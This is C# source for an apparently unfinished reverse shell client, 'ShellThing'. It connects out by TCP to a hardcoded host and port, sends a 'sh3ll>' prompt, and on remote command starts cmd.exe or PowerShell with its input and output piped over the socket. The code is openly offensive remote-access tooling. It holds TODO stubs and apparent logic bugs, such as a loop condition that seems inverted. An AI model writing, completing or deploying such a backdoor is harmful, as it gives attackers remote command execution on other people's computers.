using System;

namespace ShellThing
{
    class Program
    {
        static TcpReverseConnection connection;
        static CommandShell shell;
        static ProcessIoManager processIoManager;
        static string prompt = "sh3ll> ";

        static void Main(string[] args)
        {
            if(args.Length != 2)
            {
                //TODO - Throw an exception or just terminate instead of writing to console
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error - Incorrect Number of arguments");
                Console.ResetColor();
            }
            else
            {
                connection = new TcpReverseConnection();
                //connection.StartClient(args[0], args[1]);
                connection.StartClient("192.168.190.128", "11000");
                connection.SendData(prompt);

                while(connection.IsConnected)
                {
                    // TODO: try/catch for ctrl+c close of connection - maybe attempt reconnect??
                    string commandReceived = connection.ReceiveData();

                    ExecuteCommand(commandReceived, connection);
                    connection.SendData(prompt);
                }
            }

            void ExecuteCommand(string commandFullString, TcpReverseConnection connection)
            {
                if (commandFullString.Contains(" "))
                {

                }

                // Separate any potential parameters and/or flags to commands
                string[] commandSplit = commandFullString.Split(' ');

                Console.WriteLine(commandSplit[0].ToLower());

                // Check if the provided command is valid and if so, call the appropriate function
                switch (commandSplit[0].ToLower())
                {
                    case "shell\n":
                        SpawnShell(@"cmd.exe");
                        break;
                    case "powershell\n":
                        SpawnShell(@"powershell.exe");
                        break;
                    case "systeminfo\n":
                        connection.SendData("SystemInfo\n");
                        break;
                    case "handoff\n":
                        connection.SendData("Handoff");
                        break;
                    default:
                        connection.SendData("Invalid Command\n");
                        break;
                }
            }

            void SpawnShell(string shellType)
            {
                shell = new CommandShell(shellType);
                processIoManager = new ProcessIoManager(shell.Process, connection);

                // Subscribe to events for stdout and stderr being read from target process
                processIoManager.StdoutTextRead += new StringReadEventHandler(OnStringRead);
                processIoManager.StderrTextRead += new StringReadEventHandler(OnStringRead);

                shell.ProcessTerminated += new ProcessTerminatedEventHandler(OnProcessTerminated);
                shell.StartProcess();
                processIoManager.StartProcessOutputRead();

                // continuously write from connection.ReceiveData() to stdin of target process
                while (shell.Process.HasExited == true)
                {
                    processIoManager.WriteStdIn();
                }

                connection.SendData(prompt);
            }

            void OnStringRead(string text)
            {
                connection.SendData(text);
            }

            void OnProcessTerminated(object source, EventArgs e)
            {
                processIoManager.StopMonitoringProcessOutput();
                processIoManager.ContinueWriteToStdIn = false;
            }
        }
    }
}
